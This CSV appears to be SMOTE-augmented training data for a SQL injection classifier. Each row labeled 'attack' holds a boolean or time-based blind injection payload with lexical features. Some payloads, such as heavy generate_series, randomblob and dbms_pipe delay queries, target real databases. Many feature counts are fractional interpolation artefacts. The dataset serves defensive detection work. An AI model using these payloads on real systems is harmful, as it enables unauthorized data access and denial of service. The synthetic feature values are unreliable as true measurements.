id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000463,attack,boolean,-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000181,0.05492482457604519,72.17860142896475,24.0,3.657850472097418,13.0,24.0,26.13395107172356,9.044650357241187,0.1801524620526837,0.3325891607126469,0.36197931250191195,0.1252790647327574,0.0,0.022325178620593578,3.0,0.0,1.0,2.0,0.0,3.022325178620594,0.0,0.0,0.0,6.0,0.0,0.022325178620593578,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000464,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000146,1.5542144854959195,147.26355557550568,30.501594773588906,3.996644983987524,68.87938562736949,15.003189547177808,42.75558170756116,20.625398693397226,0.4696657809209922,0.10008761543597952,0.2887025002770592,0.1415441033659691,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.625398693397226,0.0,5.625398693397226,0.3746013066027739,5.0,4.0,4.625398693397226,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6253986933972262,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.625398693397226
SMOTE_000465,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,1.4482451140864747,80.91495712450862,23.042521437745688,3.2210531799495623,15.085042875491375,13.914957124508629,38.957478562254316,12.957478562254314,0.18715328901131184,0.1714659337108553,0.48145072985919823,0.15993004741863462,0.0,4.0,1.0,0.0,0.47873928112715725,1.4787392811271571,0.0,6.0,0.0,0.0,0.0,2.9574785622543143,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000466,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000110,0.9656787876832839,121.0154165470571,34.93187497436938,3.926977531179679,40.50770827352855,21.0,44.86374994873876,14.643958324789793,0.3342055223172578,0.17408420156687932,0.3705433613824688,0.12116691473339408,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,6.643958324789793,0.0,1.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6439583247897924,0.35604167521020746,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000467,attack,boolean,"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000267,0.48499206170437226,138.27844779349937,33.7130746322499,3.674075373276352,37.0,15.0,58.85229852899958,27.42614926449979,0.2676810997676185,0.10851936477065616,0.4255125227318752,0.19828701272985014,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.713074632249896,0.713074632249896,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000468,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R000161,0.657207725121771,80.19072596216702,27.45581799459529,3.826828032902204,32.0,9.139544986488218,27.279089972976436,11.772091002702357,0.4010128113615892,0.11277567521938872,0.3383362036342244,0.14787530978479765,2.5441820054047124,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.455817994595288,0.772091002702356,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000469,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000087,0.016525618696770543,124.86043593695976,31.0,3.445607153605577,38.0,10.0,56.88834874956781,19.972087187391953,0.3043535622930353,0.0800930427086935,0.455599916352618,0.15995347864565326,5.0,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.972087187391953,1.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000470,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000041,0.2241660619707731,130.48227563136055,31.0,3.5627671346777414,44.988183754240374,10.0,56.494091877120184,19.0,0.3444605793255773,0.07671573508121177,0.4330637889389086,0.14575989665430236,5.0,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.873522969280046,0.12647703071995334,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000471,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R000248,0.7724118594846628,96.11978616541695,28.95208553383322,3.504771180664325,20.0,16.0,44.09582893233356,16.02395723308339,0.20863935117959534,0.1669114809436763,0.4578314640654636,0.16661770381126476,4.0,1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,7.02395723308339,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000472,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000287,1.9111075460401465,142.64699938815264,30.464699938815265,4.13050747274704,78.25289957170685,8.464699938815263,37.92939987763053,18.0,0.54839283131532,0.05929066766800262,0.26597719377944407,0.12633930723723327,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.0,1.0706001223694717,0.0,2.464699938815264,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.535300061184736,0.46469993881526406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000473,attack,boolean,"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000096,0.305810513340047,146.79706258675685,31.224632823344606,4.075160472925461,67.78621488170612,18.0,40.898531293378426,20.112316411672303,0.46179472968664287,0.12275231841672207,0.27836386952536296,0.1370890823712721,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.112316411672303,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.112316411672303,0.887683588327697,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000474,attack,boolean,"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000084,1.2751928069603673,156.01236510547963,35.67078836849321,4.343652437250979,78.01236510547965,16.329211631506787,42.32921163150679,19.34157673698643,0.49999853082254164,0.10470214180076479,0.2713692981932509,0.12393002918344265,2.341576736986429,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.3292116315067855,6.341576736986429,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6707883684932144,1.670788368493214,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.6707883684932145
SMOTE_000475,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000087,0.20206097195521927,123.29353134994679,31.0,3.4674362400286705,38.0,10.0,55.63482507995744,19.65870626998936,0.3083230539134681,0.08113764576670213,0.45110812320318083,0.15943117711664892,5.0,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.65870626998936,1.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000476,attack,boolean,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000294,0.6798287478588178,143.3128776432442,29.488567701228327,3.7125559895334774,39.75571614938583,16.0,58.04572919508669,29.511432298771673,0.27761641055710623,0.11177036822466224,0.4046628008060885,0.20595042041214298,0.0,4.0,0.0,0.0,0.0,2.0,0.0,11.511432298771673,1.9999999999999998,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7557161493858369,0.24428385061416333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000477,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000187,1.4077029091605775,72.51851315015384,28.355119194135746,3.96608265148352,20.130715164814486,16.0,24.06535758240724,12.322440402932127,0.27191077495835164,0.22356111593054612,0.33157136391840364,0.17295674519269855,0.0,4.0,1.0,0.0,0.0,1.3224404029321266,0.0,3.355119194135747,0.6448808058642532,1.0,1.0,2.3224404029321266,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000478,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000123,0.7981633723929932,127.34351697272783,31.0,3.5198041783474188,35.656483027272174,13.905861621213038,56.218827675757396,21.562344648485215,0.2801254208403353,0.10904984580777197,0.4415483120015118,0.16927642135038096,5.781172324242608,1.1102230246251565e-16,0.0,1.0,0.0,1.7811723242426076,0.0,10.218827675757392,1.7811723242426076,0.0,1.0,2.7811723242426076,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.21882767575739237,0.0,0.0,0.0,1.7811723242426076,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000479,attack,boolean,"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000071,0.8104251579299858,136.86056984534002,33.0,4.211641528553065,71.0,9.0,38.64988104910354,18.210688796236475,0.5206645495018765,0.06599973162699842,0.28043358092554893,0.1329021379455762,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.210688796236473,1.0,0.0,3.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000480,attack,boolean,"1' in boolean mode  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000310,0.7277065514354791,138.60579547818784,34.02351010626396,3.8346700060260703,43.65281569071576,15.0,54.46473484060405,25.48824494686802,0.31374923650260733,0.10833488507604543,0.3937141176214604,0.1842017607998868,1.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,11.488244946868019,0.0,2.0,1.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000481,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,0.9831342383703582,63.5693504643364,22.284675232168205,3.471067702156099,25.43064953566359,4.0,24.854025696504614,9.284675232168205,0.40032425120245657,0.0629359214023576,0.3907543852834473,0.1459854421117385,0.0,1.4306495356635915,2.0,0.0,1.0,2.0,0.0,1.2846752321682047,0.0,0.0,0.0,5.5693504643364085,0.0,0.7153247678317958,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.7153247678317958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.715324767831795
SMOTE_000482,attack,boolean,"1"" and make_set  (  4214  =  9503,9503  )   and ""phjg"" like ""phjg",nearest_attack_euclidean,R000190,4.193287370704284e-05,65.00026015560627,28.00001927078565,4.198233507708397,24.999990364607175,13.000028906178475,18.0001927078565,9.000048176964125,0.3846141922758043,0.19999974864192632,0.2769243884966153,0.13846167058565412,0.0,4.0,9.635392824836053e-06,0.0,0.0,1.0,0.0,2.000038541571299,0.0,1.0,1.0,1.000009635392825,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999903646071755,9.635392824836053e-06,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000483,attack,boolean,"1  )   where 7485  =  7485 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000109,0.6140434242194244,70.51381510539244,25.567481398459307,3.7191189436933545,14.78374069922965,21.0,25.730074406162775,9.0,0.21021565249160176,0.2982856374498015,0.3636620082943961,0.12783670176420064,0.0,1.1102230246251565e-16,2.0,0.0,0.21625930077034677,2.0,0.0,3.2162593007703464,0.0,0.7837406992296532,0.7837406992296532,4.216259300770346,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000484,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000292,0.19764428087653746,134.4722980588092,28.69445961176184,3.9901679802171035,84.0,3.0,33.77783844704736,13.69445961176184,0.6248499642489913,0.022316070151749703,0.25102467426695774,0.10180929133230138,3.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,4.69445961176184,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000485,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R000248,0.6296382202737986,97.02185140526908,28.59125943789237,3.480329726182343,20.0,16.0,44.81748112421526,16.204370281053816,0.20667641952938945,0.16534113562351155,0.4610506719718013,0.1669317728752977,4.0,1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,7.204370281053817,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000486,attack,boolean,"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",nearest_attack_euclidean,R000069,2.6163870581644213,149.7752454328862,36.46769810696308,3.985109532407044,51.2584151442954,22.06460378607385,54.79071703733233,21.661509465184626,0.34229343697795794,0.14773407827907273,0.3657598931164809,0.14421259162648845,5.06460378607385,1.1102230246251565e-16,0.0,0.532301893036925,0.4676981069630749,2.0,0.0,9.06460378607385,0.0,0.46769810696307484,1.0,6.06460378607385,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.532301893036925,1.4676981069630748,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.467698106963075
SMOTE_000487,attack,boolean,"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000034,0.195110320486223,122.0,32.08578949414098,3.491011356472255,32.0,15.0,56.0,19.0,0.26229508196721313,0.12295081967213115,0.45901639344262296,0.1557377049180328,2.9142105058590166,0.08578949414098314,2.0,1.0,0.0,1.0,0.0,11.0,0.0,0.0,1.0,4.0,1.0,0.08578949414098314,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000488,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000205,1.8978843939147918,165.0,37.531379824910395,4.132208380762935,67.0,18.0,57.0,23.0,0.40606060606060607,0.10909090909090909,0.34545454545454546,0.1393939393939394,5.874480700358421,2.1255192996415797,1.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,6.0,1.0,0.5313798249103949,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000489,attack,boolean,"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",nearest_attack_euclidean,R000033,0.760813577755605,89.77832130595766,22.0,3.176112822610241,19.464844111257328,13.0,43.697266166885996,13.616211027814334,0.21627154563356552,0.1453321998234492,0.4865086182534262,0.1518876362895591,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.3837889721856675,0.0,7.232422055628665,0.0,0.0,1.0,1.3837889721856675,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000490,attack,boolean,"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R000015,0.8439607352417183,166.75036565646602,34.50024377097735,4.196368249781835,81.75085319842071,16.0,48.0,20.999512458045302,0.4901480137741697,0.09595758713540115,0.28787276140620344,0.12602163768422572,3.4997562290226525,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,6.499756229022652,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.749878114511326,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000491,attack,boolean,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",nearest_attack_euclidean,R000025,0.36463311777226587,98.23268833063786,27.276731166936216,3.4014463621372673,20.0,16.0,45.78615066451029,16.446537666127572,0.2040415877910176,0.1632332702328141,0.4653717960227311,0.16735334595343718,0.0,4.0,1.0,0.0,0.0,2.0,0.0,7.446537666127572,0.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000492,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000027,0.40900063856035257,135.53502789028207,30.0,3.910972647681664,72.0,8.0,39.779189908568384,15.755837981713677,0.5317067440525367,0.059078527116948526,0.29301097074290827,0.11620375808760647,0.8779189908568384,0.12208100914316167,2.0,0.0,1.0,1.0,0.0,5.755837981713677,0.0,0.0,2.0,4.0,0.8779189908568384,0.1220810091431615,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
